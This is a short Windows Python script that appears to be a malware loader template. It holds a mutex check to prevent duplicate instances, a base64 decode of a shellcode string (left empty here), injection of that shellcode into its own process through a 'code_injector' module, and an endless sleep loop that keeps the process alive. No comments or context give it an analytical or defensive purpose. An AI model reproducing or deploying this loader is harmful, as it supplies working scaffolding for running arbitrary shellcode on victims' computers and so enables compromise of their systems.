import os, base64, sys, time, code_injector, win32api, win32event, winerror

encryptedShellcode = ""

# prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PKNBW_MUTEX_GJSU21")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

shellcode = base64.b64decode(encryptedShellcode)

pid = os.getpid()  # get current pid

code_injector.InjectShellCode(pid, shellcode)

while True:  # run forever
    time.sleep(99999)
